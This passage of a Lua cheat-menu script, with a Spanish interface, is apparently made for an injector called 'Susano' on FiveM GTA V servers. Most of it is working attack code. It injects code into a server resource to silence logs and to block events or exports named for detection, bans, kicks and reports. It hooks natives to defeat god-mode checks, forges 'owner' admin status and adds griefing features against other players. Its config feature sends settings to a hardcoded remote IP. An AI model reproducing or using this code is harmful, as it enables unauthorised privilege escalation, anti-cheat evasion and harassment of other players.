            Menu.ActionKickVehicle()
    end
end

    Actions.removeAllTiresItem = FindItem("En linea", "Vehiculo", "quitar todas las ruedas")
    if Actions.removeAllTiresItem then
        Actions.removeAllTiresItem.onClick = function()
            Menu.ActionRemoveAllTires()
        end
    end

    Actions.giveItem = FindItem("En linea", "Vehiculo", "Regalar")
    if Actions.giveItem then
        Actions.giveItem.onClick = function(index, option)
                            Menu.GiveMode = option
            Menu.ActionGive()
    end
end

    Actions.tpToItem = FindItem("En linea", "Vehiculo", "TP a")
    if Actions.tpToItem then
        Actions.tpToItem.onClick = function(index, option)
        if option then
            Menu.TPLocation = option
        end
            Menu.ActionTPTo()
        end
    end
end

CreateThread(function()
    while not Menu or not Menu.Categories do
        Wait(100)
    end

    local found = false
    local attempts = 0
    while not found and attempts < 50 do
        for _, cat in ipairs(Menu.Categories) do
            if cat.name == "Varios" then
                found = true
                break
            end
        end
        if not found then
            Wait(100)
            attempts = attempts + 1
        end
    end

    if not found then
        return
    end

    Wait(500)

    for _, cat in ipairs(Menu.Categories) do
        if cat.name == "Varios" and cat.tabs then
            for _, tab in ipairs(cat.tabs) do
                if tab.name == "Bypasses" and tab.items then
                    for _, item in ipairs(tab.items) do
                        if item.name == "Bypass Putin" then
                            break
                        end
                    end
                end
            end
        end
    end

    Actions.testItem = FindItem("Varios", "Bypasses", "Bypass Putin")
    if Actions.testItem then
        Actions.testItem.onClick = function()
            local targetResource = "Putin"

            if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
                return
            end

            if not targetResource or GetResourceState(targetResource) ~= "started" then
                return
            end

            Susano.InjectResource(targetResource, [[
                local p = print
                local w = warn
                local e = error
                p = function() end
                w = function() end
                e = function() end

                if Citizen then
                    local t = Citizen.Trace
                    Citizen.Trace = function(m)
                        if m and type(m) == "string" then
                            local l = string.lower(m)
                            if string.find(l, "debug") or string.find(l, "detect") or
                               string.find(l, "violation") or string.find(l, "cheat") or
                               string.find(l, "inject") or string.find(l, "hook") or
                               string.find(l, "susano") or string.find(l, "bypass") or
                               string.find(l, "ac:") or string.find(l, "anticheat") or
                               string.find(l, "ban") or string.find(l, "kick") or
                               string.find(l, "log") or string.find(l, "report") then
                                return
                            end
                        end
                        if t then t(m) end
                    end
                end

                local ts = TriggerServerEvent
                local te = TriggerEvent
                local ae = AddEventHandler
                local rn = RegisterNetEvent
                if TriggerServerEvent then
                    TriggerServerEvent = function(n, ...)
                        if n and type(n) == "string" then
                            local l = string.lower(n)
                            if string.find(l, "detect") or string.find(l, "violation") or
                               string.find(l, "cheat") or string.find(l, "ban") or
                               string.find(l, "kick") or string.find(l, "log") or
                               string.find(l, "report") or string.find(l, "ac:") then
                                return
                            end
                        end
                        if ts then return ts(n, ...) end
                    end
                end

                if TriggerEvent then
                    TriggerEvent = function(n, ...)
                        if n and type(n) == "string" then
                            local l = string.lower(n)
                            if string.find(l, "detect") or string.find(l, "violation") or
                               string.find(l, "cheat") or string.find(l, "ac:") then
                                return
                            end
                        end
                        if te then return te(n, ...) end
                    end
                end

                if AddEventHandler then
                    AddEventHandler = function(n, h)
                        if n and type(n) == "string" then
                            local l = string.lower(n)
                            if string.find(l, "detect") or string.find(l, "violation") or
                               string.find(l, "cheat") or string.find(l, "ac:") then
                                return
                            end
                        end
                        if ae then return ae(n, h) end
                    end
                end

                if RegisterNetEvent then
                    RegisterNetEvent = function(n)
                        if n and type(n) == "string" then
                            local l = string.lower(n)
                            if string.find(l, "detect") or string.find(l, "violation") or
                               string.find(l, "cheat") or string.find(l, "ac:") then
                                return
                            end
                        end
                        if rn then return rn(n) end
                    end
                end

                if exports then
                    local ex = exports
                    exports = setmetatable({}, {
                        __index = function(t, k)
                            local r = ex[k]
                            if type(r) == "table" then
                                return setmetatable({}, {
                                    __index = function(t2, k2)
                                        local f = r[k2]
                                        if type(f) == "function" then
                                            local lk = string.lower(tostring(k))
                                            local lk2 = string.lower(tostring(k2))
                                            if string.find(lk, "ac") or string.find(lk, "anticheat") or
                                               string.find(lk2, "detect") or string.find(lk2, "check") or
                                               string.find(lk2, "ban") or string.find(lk2, "kick") then
                                                return function() return true end
                                            end
                                        end
                                        return f
                                    end
                                })
                            end
                            return r
                        end
                    })
                end

                local origGetEntityProofs = GetEntityProofs
                GetEntityProofs = function(entity)
                    local playerPed = PlayerPedId()
                    if entity == playerPed then
                        return false, false, false, false, false, false, false, false
                    end
                    if origGetEntityProofs then
                        return origGetEntityProofs(entity)
                    end
                    return false, false, false, false, false, false, false, false
                end

                if CheckPlayerProofs then
                    local origCheckPlayerProofs = CheckPlayerProofs
                    CheckPlayerProofs = function()
                        return
                    end
                end

                if StartGodModeCheck then
                    local origStartGodModeCheck = StartGodModeCheck
                    StartGodModeCheck = function()
                        return
                    end
                end

                local _SetEntityHealthOriginal = SetEntityHealth
                if _SetEntityHealthOriginal then
                    _G._SetEntityHealthOriginal = _SetEntityHealthOriginal
                end

                SetEntityHealth = function(entity, health)
                    local playerPed = PlayerPedId()
                    if entity == playerPed then
                        if GameMode and GameMode.PlayerData then
                            GameMode.PlayerData.health = health
                        end
                        Citizen.InvokeNative(0x6B76DC1F3AE6E6A3, entity, health)
                        if GameMode and GameMode.PlayerData then
                            GameMode.PlayerData.health = health
                        end
                        return
                    end
                    if _SetEntityHealthOriginal then
                        return _SetEntityHealthOriginal(entity, health)
                    end
                    Citizen.InvokeNative(0x6B76DC1F3AE6E6A3, entity, health)
                end

                CreateThread(function()
                    while true do
                        Wait(0)
                        local playerPed = PlayerPedId()
                        if DoesEntityExist(playerPed) then
                            local currentHealth = GetEntityHealth(playerPed)
                            if GameMode and GameMode.PlayerData then
                                if not GameMode.PlayerData.health or GameMode.PlayerData.health < currentHealth then
                                    GameMode.PlayerData.health = currentHealth
                                end
                            end
                        end
                    end
                end)
            ]])

            Wait(50)

            Susano.InjectResource(targetResource, [[
                local s = rawget(_G, "Susano")
                if s and type(s) == "table" and type(s.HookNative) == "function" then
                    s.HookNative(0x2B40A976, function() return 0 end)
                    s.HookNative(0x5324A0E3E4CE3570, function() return false end)
                    s.HookNative(0x8DE82BC774F3B862, function() return nil end)
                    s.HookNative(0x2B1813BA58063D36, function() return "core" end)

                    s.HookNative(0xFAEE099C6F890BB8, function(entity)
                        local playerPed = PlayerPedId()
                        if entity == playerPed then
                            return false, false, false, false, false, false, false, false
                        end
                        return true
                    end)

                    if CheckPlayerProofs then
                        local origCheckPlayerProofs = CheckPlayerProofs
                        CheckPlayerProofs = function()
                            return
                        end
                    end

                    if StartGodModeCheck then
                        local origStartGodModeCheck = StartGodModeCheck
                        StartGodModeCheck = function()
                            return
                        end
                    end
                end

                local pr = {
                    ["TriggerEvent"] = true, ["Wait"] = true, ["Citizen"] = true,
                    ["CreateThread"] = true, ["GetEntityCoords"] = true,
                    ["PlayerPedId"] = true, ["GetHashKey"] = true
                }

                local bp = {"detect", "check", "ban", "kick", "log", "report", "monitor", "track", "verify", "ac", "anticheat"}

                for n, f in pairs(_G) do
                    if not pr[n] and type(f) == "function" then
                        local nl = string.lower(tostring(n))
                        for _, p in ipairs(bp) do
                            if string.find(nl, p) then
                                _G[n] = function() return true end
                                break
                            end
                        end
                    end
                end
            ]])

            Wait(50)

            Susano.InjectResource("Putin", [[
_zeubiiii = TriggerServerEvent
_zouzzie = GetStateBagValue

GetEntityScript = nil
IsEntityGhostedToLocalPlayer = nil

TriggerServerEvent = function(eventName, ...)
    print('TRIGGER EVENT ->', eventName, ...)
    if eventName:find('PutinAC') then
        return
    end
    return _zeubiiii(eventName, ...)
end

GetInvokingResource = function()
    return nil
end

GetStateBagValue = function(bag, key)
    if key == 'doCheckPlayerPed' then
        return false
    end
    return _zouzzie(bag, key)
end
]])

        end
    else
    end
end)

do
    local tpSelector = FindItem("Varios", "General", "Teletransportar a")

    if tpSelector then
        tpSelector.onClick = function(index, option)
            if option == "Punto de ruta" then
                Menu.ActionTPToWaypoint()
            elseif option == "Edificio FIB" then
                Menu.ActionTPToFIB()
            elseif option == "Comisaria de Mission Row" then
                Menu.ActionTPToMissionRowPD()
            elseif option == "Hospital Pillbox" then
                Menu.ActionTPToPillboxHospital()
            elseif option == "Calle Grove" then
                Menu.ActionTPToGroveStreet()
            elseif option == "Plaza Legion" then
                Menu.ActionTPToLegionSquare()
            end
    end
end

    Actions.staffModeItem = FindItem("Varios", "General", "Modo staff")
    if Actions.staffModeItem then
        Actions.staffModeItem.onClick = function(value)
            Menu.StaffModeEnabled = value
            if value then
                CreateThread(function()
                    while Menu.StaffModeEnabled do
                        Wait(0)
                        if IsPedShooting(PlayerPedId()) or IsControlJustPressed(0, 24) then
                            local playerPed = PlayerPedId()
                            local camPos = GetGameplayCamCoord()
                            local camRot = GetGameplayCamRot(2)

                            local function RotationToDirection(rotation)
                                local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                                local direction = vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                                return direction
                            end

                            local direction = RotationToDirection(camRot)
                            local dest = vector3(camPos.x + direction.x * 1000.0, camPos.y + direction.y * 1000.0, camPos.z + direction.z * 1000.0)

                            local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                            local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)

                            if hit == 1 and DoesEntityExist(entityHit) then
                                local entityType = GetEntityType(entityHit)
                                if entityType == 1 then
                                    local hitPed = entityHit
                                    for _, player in ipairs(GetActivePlayers()) do
                                        if player ~= PlayerId() then
                                            local targetPed = GetPlayerPed(player)
                                            if targetPed == hitPed then
                                                local targetServerId = GetPlayerServerId(player)
                                                Menu.SelectedPlayer = targetServerId

                                                if Menu.Visible then
                                                    for i, cat in ipairs(Menu.Categories) do
                                                        if cat.name == "En linea" then
                                                            Menu.CurrentCategory = i
                                                            Menu.OpenedCategory = i
                                                            if cat.hasTabs then
                                                                for j, tab in ipairs(cat.tabs) do
                                                                    if tab.name == "Troleo" then
                                                                        Menu.CurrentTab = j
                                                                        break
                                                                    end
                                                                end
                                                            end
                                                            break
                                                        end
                                                    end
                                                else
                                                    Menu.Visible = true
                                                    for i, cat in ipairs(Menu.Categories) do
                                                        if cat.name == "En linea" then
                                                            Menu.CurrentCategory = i
                                                            Menu.OpenedCategory = i
                                                            if cat.hasTabs then
                                                                for j, tab in ipairs(cat.tabs) do
                                                                    if tab.name == "Troleo" then
                                                                        Menu.CurrentTab = j
                                                                        break
                                                                    end
                                                                end
                                                            end
                                                            break
                                                        end
                                                    end
                                                end
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end

    Actions.disableWeaponDamageItem = FindItem("Varios", "General", "Desactivar dano de armas")
    if Actions.disableWeaponDamageItem then
        Actions.disableWeaponDamageItem.onClick = function(value)
            Menu.DisableWeaponDamage = value
            if value then
                CreateThread(function()
                    while Menu.DisableWeaponDamage do
                        Wait(0)
                        SetPlayerWeaponDamageModifier(PlayerId(), 0.0)
                        if type(susano) == "table" and type(susano.HookNative) == "function" then
                            if not Menu.WeaponDamageHookSet then
                                susano.HookNative(0x46E571A0D20E5076, function(player, modifier)
                                    if player == PlayerId() then
                                        return 0.0
                                    end
                                    return modifier
                                end)
                                Menu.WeaponDamageHookSet = true
                            end
                        end
                    end
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                    Menu.WeaponDamageHookSet = false
                end)
            end
        end
    end

    Actions.killAllPedsItem = FindItem("Varios", "General", "Matar todos los peds")
    if Actions.killAllPedsItem then
        Actions.killAllPedsItem.onClick = function(value)
            Menu.KillAllPeds = value
            if value then
                CreateThread(function()
                    local playerPed = PlayerPedId()

                    while Menu.KillAllPeds do
                        Wait(50)

                        playerPed = PlayerPedId()
                        local playerCoords = GetEntityCoords(playerPed)

                        
                        local allPlayers = GetActivePlayers()
                        local playerPeds = {}
                        for _, playerId in ipairs(allPlayers) do
                            local playerPedId = GetPlayerPed(playerId)
                            if playerPedId and DoesEntityExist(playerPedId) then
                                table.insert(playerPeds, playerPedId)
                            end
                        end

                        local peds = GetGamePool('CPed')
                        for _, ped in ipairs(peds) do
                            if DoesEntityExist(ped) and ped ~= playerPed then
                                
                                local isPlayer = false
                                for _, playerPedId in ipairs(playerPeds) do
                                    if ped == playerPedId then
                                        isPlayer = true
                                        break
                                    end
                                end
                                
                               
                                if not isPlayer then
                                    local playerId = NetworkGetPlayerIndexFromPed(ped)
                                    if playerId ~= -1 and NetworkIsPlayerActive(playerId) then
                                        isPlayer = true
                                    end
                                end
                                
                                
                                if not isPlayer and not IsPedAPlayer(ped) then
                                    local pedCoords = GetEntityCoords(ped)
                                    local distance = #(playerCoords - pedCoords)

                                    if distance <= 100.0 and not IsPedDeadOrDying(ped, true) then
                                        
                                        SetPedDiesWhenInjured(ped, true)
                                        SetEntityHealth(ped, 0)
                                        ApplyDamageToPed(ped, 10000, false, playerPed)
                                        
                                        
                                        if not IsPedDeadOrDying(ped, true) then
                                            SetEntityHealth(ped, -1)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end

Actions.launchOnTargetItem = FindItem("Varios", "General", "Lanzar sobre objetivo")
if Actions.launchOnTargetItem then
    local launchOnTargetKey = nil
    local launchOnTargetEnabled = false
    
    local keyNameToCode = {
        ["E"] = 38, ["F"] = 23, ["G"] = 47, ["X"] = 73, ["B"] = 29,
        ["V"] = 0, ["H"] = 74, ["Y"] = 246, ["U"] = 303, ["K"] = 311,
        ["N"] = 249, ["Q"] = 44, ["T"] = 245, ["R"] = 45, ["Z"] = 20,
        ["SPACE"] = 22, ["SHIFT"] = 21, ["CTRL"] = 36, ["ALT"] = 19,
        ["TAB"] = 37, ["CAPS"] = 137, ["ENTER"] = 18, ["BACKSPACE"] = 194,
        ["DELETE"] = 178, ["INSERT"] = 121, ["HOME"] = 213, ["END"] = 214,
        ["PAGEUP"] = 10, ["PAGEDOWN"] = 11,
        ["LEFT"] = 174, ["RIGHT"] = 175, ["UP"] = 172, ["DOWN"] = 173,
        ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F4"] = 166,
        ["F5"] = 167, ["F6"] = 168, ["F7"] = 169, ["F8"] = 56, ["F9"] = 57, ["F10"] = 58
    }
    
    Actions.launchOnTargetItem.onClick = function(value)
        launchOnTargetEnabled = value
        
        if value then
            if Menu and Menu.OpenInput then
                Menu.OpenInput("Lanzar sobre objetivo", "Introduce la tecla (E, F, X, B, V, etc.)", function(input)
                    if input and input ~= "" then
                        local keyUpper = input:upper()
                        
                        if keyNameToCode[keyUpper] then
                            launchOnTargetKey = keyNameToCode[keyUpper]
                            
                            if type(Susano) == "table" and type(Susano.ShowNotification) == "function" then
                                Susano.ShowNotification("~g~¡Tecla registrada!~s~\nTecla: " .. keyUpper)
                            end
                        else
                            if type(Susano) == "table" and type(Susano.ShowNotification) == "function" then
                                Susano.ShowNotification("~r~¡Error!~s~\nTecla invalida: " .. input)
                            end
                            
                            launchOnTargetEnabled = false
                            Actions.launchOnTargetItem.value = false
                        end
                    else
                        launchOnTargetEnabled = false
                        Actions.launchOnTargetItem.value = false
                    end
                end)
            end
        end
    end
    
    CreateThread(function()
        local lastLaunch = 0
        
        while true do
            Wait(0)
            
            if launchOnTargetEnabled and launchOnTargetKey then
                local shouldLaunch = false
                
                if IsControlJustPressed(0, launchOnTargetKey) then
                    shouldLaunch = true
                end
                
                if type(Susano) == "table" and type(Susano.GetAsyncKeyState) == "function" then
                    if Susano.GetAsyncKeyState(launchOnTargetKey) and (GetGameTimer() - lastLaunch) > 300 then
                        shouldLaunch = true
                    end
                end
                
                if shouldLaunch then
                    lastLaunch = GetGameTimer()
                    local myPed = PlayerPedId()
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    
                    local pitch = math.rad(camRot.x)
                    local yaw = math.rad(camRot.z)
                    
                    local dirX = -math.sin(yaw) * math.cos(pitch)
                    local dirY = math.cos(yaw) * math.cos(pitch)
                    local dirZ = math.sin(pitch)
                    
                    local raycastStart = camCoords
                    local raycastEnd = vector3(
                        camCoords.x + dirX * 1000.0,
                        camCoords.y + dirY * 1000.0,
                        camCoords.z + dirZ * 1000.0
                    )
                    
                    local raycast = StartExpensiveSynchronousShapeTestLosProbe(
                        raycastStart.x, raycastStart.y, raycastStart.z,
                        raycastEnd.x, raycastEnd.y, raycastEnd.z,
                        -1, myPed, 7
                    )
                    
                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(raycast)
                    
                    if hit and entityHit and DoesEntityExist(entityHit) then
                       
                        local targetPlayerId = nil
                        local allPlayers = GetActivePlayers()
                        
                        for _, playerId in ipairs(allPlayers) do
                            local playerPedId = GetPlayerPed(playerId)
                            if playerPedId == entityHit then
                                targetPlayerId = playerId
                                break
                            end
                        end
                        
                        
                        if targetPlayerId then
                            local targetPed = GetPlayerPed(targetPlayerId)
                            if targetPed and DoesEntityExist(targetPed) then
                                CreateThread(function()
                                    local myCoords = GetEntityCoords(myPed)
                                    local targetCoords = GetEntityCoords(targetPed)
                                    
                                    
                                    local originalCoords = myCoords
                                    local originalHeading = GetEntityHeading(myPed)
                                    local distance = #(myCoords - targetCoords)
                                    local teleported = false
                                    
                                    if distance > 10.0 then
                                        local angle = math.random() * 2 * math.pi
                                        local radiusOffset = math.random(5, 9)
                                        local xOffset = math.cos(angle) * radiusOffset
                                        local yOffset = math.sin(angle) * radiusOffset
                                        local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                                        SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                        SetEntityVisible(myPed, false, 0)
                                        teleported = true
                                        Wait(30)
                                    end
                                    
                                    ClearPedTasksImmediately(myPed)
                                    for i = 1, 10 do
                                        if not DoesEntityExist(targetPed) then
                                            break
                                        end
                                        
                                        local curTargetCoords = GetEntityCoords(targetPed)
                                        if not curTargetCoords then
                                            break
                                        end
                                        
                                        SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                                        Wait(30)
                                        AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                                        Wait(30)
                                        DetachEntity(myPed, true, true)
                                        Wait(50)
                                    end
                                    
                                    Wait(200)
                                    ClearPedTasksImmediately(myPed)
                                    
                                    
                                    SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                    SetEntityHeading(myPed, originalHeading)
                                    
                                    if teleported then
                                        SetEntityVisible(myPed, true, 0)
                                    end
                                end)
                            end
                        end
                    end
                end
            end
        end
    end)
end

    Actions.menuStaffItem = FindItem("Varios", "Exploits", "Menu staff")
    if Actions.menuStaffItem then
        Actions.menuStaffItem.onClick = function()
            local targetResource = "Putin"

            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                if GetResourceState(targetResource) ~= "started" then
                    local alternatives = {"mapmanager", "spawnmanager", "sessionmanager", "baseevents", "chat", "hardcap", "esextended"}
                    for _, r in ipairs(alternatives) do
                        if GetResourceState(r) == "started" then
                            targetResource = r
                            break
                        end
                    end
                end

                local codeToInject = [[
                    if not GameMode then GameMode = {} end
                    if not GameMode.PlayerData then GameMode.PlayerData = {} end
                    GameMode.PlayerData.group = "owner"

                    if ESX then
                        if ESX.PlayerData then ESX.PlayerData.group = "owner" end
                        if ESX.SetPlayerData then ESX.SetPlayerData('group', 'owner') end
                    end

                    if not AdminSystem then AdminSystem = {} end
                    if not AdminSystem.Service then AdminSystem.Service = {} end
                    AdminSystem.Service.enabled = true

                    if type(ToggleMenu) == "function" then
                        ToggleMenu("staff")
                    end
                ]]

                Susano.InjectResource(targetResource, codeToInject)
            end
        end
    end

    Actions.reviveItem = FindItem("Jugador", "Revive", "Revivir")
    if Actions.reviveItem then
        Actions.reviveItem.onClick = function()
            if Menu and Menu.OpenInput then
                Menu.OpenInput("Confirmacion", "Booboo ?", function(input)
                    if input and string.lower(input) == "oui" then
                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("Putin", [[
                                TriggerServerEvent('ambulance:requestRespawnHopital','normal')
                            ]])
                        end
                    end
                end)
            end
        end
    end

    local function SimpleJsonEncode(tbl, indent)
        indent = indent or 0
        local result = {}
        local isArray = true
        local maxIndex = 0

        for k, v in pairs(tbl) do
            if type(k) ~= "number" then
                isArray = false
                break
            end
            if k > maxIndex then maxIndex = k end
        end

        if maxIndex ~= #tbl then isArray = false end

        for k, v in pairs(tbl) do
            local key
            if isArray then
                key = ""
            else
                key = type(k) == "string" and '"' .. string.gsub(k, '"', '\\"') .. '"' or tostring(k)
            end

            local value
            if type(v) == "table" then
                value = SimpleJsonEncode(v, indent + 1)
            elseif type(v) == "string" then
                value = '"' .. string.gsub(v, '"', '\\"') .. '"'
            elseif type(v) == "boolean" then
                value = v and "true" or "false"
            elseif type(v) == "number" then
                value = tostring(v)
            else
                value = '"' .. tostring(v) .. '"'
            end

            if isArray then
                table.insert(result, value)
            else
                table.insert(result, key .. ":" .. value)
            end
        end

        if isArray then
            return "[" .. table.concat(result, ",") .. "]"
        else
            return "{" .. table.concat(result, ",") .. "}"
        end
    end

    local function CollectCurrentConfig()
        local config = {}

        for _, category in ipairs(Menu.Categories or {}) do
            if category.hasTabs and category.tabs then
                for _, tab in ipairs(category.tabs) do
                    if tab.items then
                        for _, item in ipairs(tab.items) do
                            if item.name and not item.isSeparator then
                                local key = category.name .. "|" .. tab.name .. "|" .. item.name
                                if item.type == "toggle" then
                                    config[key] = { type = "toggle", value = item.value or false }

                                    if item.bindKey then
                                        config[key].bindKey = item.bindKey
                                        config[key].bindKeyName = item.bindKeyName
                                    end
                                elseif item.type == "selector" then
                                    config[key] = { type = "selector", selected = item.selected or 1 }

                                    if item.bindKey then
                                        config[key].bindKey = item.bindKey
                                        config[key].bindKeyName = item.bindKeyName
                                    end
                                elseif item.type == "slider" then
                                    config[key] = { type = "slider", value = item.value or 0 }

                                    if item.bindKey then
                                        config[key].bindKey = item.bindKey
                                        config[key].bindKeyName = item.bindKeyName
                                    end
                                elseif item.bindKey then
                                    config[key] = { type = "bind", key = item.bindKey, keyName = item.bindKeyName }
                                end
                            end
                        end
                    end
                end
            end
        end

        config["Menu.magicbulletEnabled"] = Menu.magicbulletEnabled or false
        config["Menu.noReloadEnabled"] = Menu.noReloadEnabled or false
        config["Menu.noRecoilEnabled"] = Menu.noRecoilEnabled or false
        config["Menu.noSpreadEnabled"] = Menu.noSpreadEnabled or false
        config["Menu.FOVWarp"] = Menu.FOVWarp or false
        config["Menu.ShowKeybinds"] = Menu.ShowKeybinds or false
        config["Menu.CurrentTheme"] = Menu.CurrentTheme or "Purple"

        return config
    end

    local function ApplyConfig(config)
        if not config or type(config) ~= "table" then
            print("ApplyConfig: parametro de configuracion invalido")
            return
        end

        if not Menu then
            print("ApplyConfig: menu no disponible")
            return
        end

        local itemsToActivate = {}

        for key, data in pairs(config) do
            if not key or type(key) ~= "string" then
                print("ApplyConfig: omitiendo clave invalida: " .. tostring(key))
            else
                local success, err = pcall(function()
                    if string.find(key, "|") then
                    local parts = {}
                    for part in string.gmatch(key, "([^|]+)") do
                        table.insert(parts, part)
                    end

                    if #parts == 3 then
                        local categoryName, tabName, itemName = parts[1], parts[2], parts[3]
                        if categoryName and tabName and itemName then
                            local item = FindItem(categoryName, tabName, itemName)
                            if item and type(item) == "table" and data and type(data) == "table" and data.type then
                                pcall(function()

                                    if data.type == "toggle" and data.value ~= nil and (not item.type or item.type == "toggle") then
                                        local boolValue = false
                                        if type(data.value) == "boolean" then
                                            boolValue = data.value
                                        elseif type(data.value) == "string" then
                                            boolValue = (data.value == "true" or data.value == "1")
                                        elseif type(data.value) == "number" then
                                            boolValue = (data.value ~= 0)
                                        end

                                        item.value = boolValue

                                        
                                        if item.onClick and type(item.onClick) == "function" and boolValue == true then
                                            table.insert(itemsToActivate, { item = item, value = boolValue })
                                        end

                                        if data.bindKey then
                                            item.bindKey = data.bindKey
                                        end
                                        if data.bindKeyName then
                                            item.bindKeyName = data.bindKeyName
                                        end
                                    elseif data.type == "selector" and data.selected ~= nil and (not item.type or item.type == "selector") then
                                        local selectedIndex = data.selected
                                        if type(selectedIndex) == "string" then
                                            selectedIndex = tonumber(selectedIndex)
                                            if not selectedIndex then selectedIndex = 1 end
                                        elseif type(selectedIndex) ~= "number" then
                                            selectedIndex = 1
                                        end
                                        if item.options and type(item.options) == "table" and type(selectedIndex) == "number" then
                                            local maxIndex = #item.options
                                            if selectedIndex >= 1 and selectedIndex <= maxIndex then

                                                item.selected = selectedIndex
                                            end
                                        end

                                        if data.bindKey then
                                            item.bindKey = data.bindKey
                                        end
                                        if data.bindKeyName then
                                            item.bindKeyName = data.bindKeyName
                                        end
                                    elseif data.type == "slider" and data.value ~= nil and (not item.type or item.type == "slider") then
                                        if type(data.value) == "number" then
                                            item.value = data.value
                                        end

                                        if data.bindKey then
                                            item.bindKey = data.bindKey
                                        end
                                        if data.bindKeyName then
                                            item.bindKeyName = data.bindKeyName
                                        end
                                    elseif data.type == "bind" then
                                        if data.key then
                                            item.bindKey = data.key
                                        end
                                        if data.keyName then
                                            item.bindKeyName = data.keyName
                                        end
                                    end
                                end)
                            end
                        end
                    end
                elseif key == "Menu.magicbulletEnabled" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.magicbulletEnabled = boolValue
                    end
                elseif key == "Menu.noReloadEnabled" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.noReloadEnabled = boolValue
                    end
                elseif key == "Menu.noRecoilEnabled" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.noRecoilEnabled = boolValue
                    end
                elseif key == "Menu.noSpreadEnabled" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.noSpreadEnabled = boolValue
                    end
                elseif key == "Menu.FOVWarp" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.FOVWarp = boolValue
                    end
                elseif key == "Menu.ShowKeybinds" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.ShowKeybinds = boolValue
                    end
                elseif key == "Menu.CurrentTheme" then
                    if Menu and Menu.ApplyTheme then
                        local themeValue = data
                        if type(data) == "string" then
                            themeValue = data
                        elseif type(data) == "number" then
                            themeValue = tostring(data)
                        else
                            themeValue = "Purple"
                        end
                        Menu.ApplyTheme(themeValue)
                        
                        
                        local menuThemeItem = FindItem("Ajustes", "General", "Tema del menu")
                        if menuThemeItem and menuThemeItem.options then
                            local themeIndex = nil
                            for i, option in ipairs(menuThemeItem.options) do
                                if string.lower(option) == string.lower(themeValue) then
                                    themeIndex = i
                                    break
                                end
                            end
                            if themeIndex then
                                menuThemeItem.selected = themeIndex
                            end
                        end
                    end
                end
                end)

                if not success then
                    print("Error al aplicar configuracion para clave: " .. tostring(key) .. " - " .. tostring(err))
                end
            end
        end

        
        if #itemsToActivate > 0 then
            CreateThread(function()
                for i, itemData in ipairs(itemsToActivate) do
                    if itemData.item and itemData.item.onClick and type(itemData.item.onClick) == "function" then
                        pcall(function()
                            itemData.item.onClick(itemData.value)
                        end)
                        
                        Wait(100)
                    end
                end
            end)
        end

        print("[Cargar Configuracion] Valores de configuracion restaurados. Haz clic en las opciones del menu para activarlas.")
    end

    Actions.createConfigItem = FindItem("Ajustes", "Configuracion", "Crear configuracion")
    if Actions.createConfigItem then
        Actions.createConfigItem.onClick = function()
            if Menu and Menu.OpenInput then
                Menu.OpenInput("Crear configuracion", "Introduce un codigo para tu configuracion:", function(code)
                    if not code or code == "" then return end

                    code = string.lower(string.gsub(code, "%s+", ""))

                    local config = CollectCurrentConfig()

                    CreateThread(function()
                        local jsonData = SimpleJsonEncode({ code = code, config = config })
                        local baseUrl = "http://82.22.7.19:25010"

                        if type(Susano) == "table" and type(Susano.HttpGet) == "function" then
                            local encodedData = ""
                            for i = 1, #jsonData do
                                local byte = string.byte(jsonData, i)
                                if (byte >= 48 and byte <= 57) or (byte >= 65 and byte <= 90) or (byte >= 97 and byte <= 122) or byte == 45 or byte == 95 or byte == 46 or byte == 126 then
                                    encodedData = encodedData .. string.char(byte)
                                else
                                    encodedData = encodedData .. string.format("%%%02X", byte)
                                end
                            end

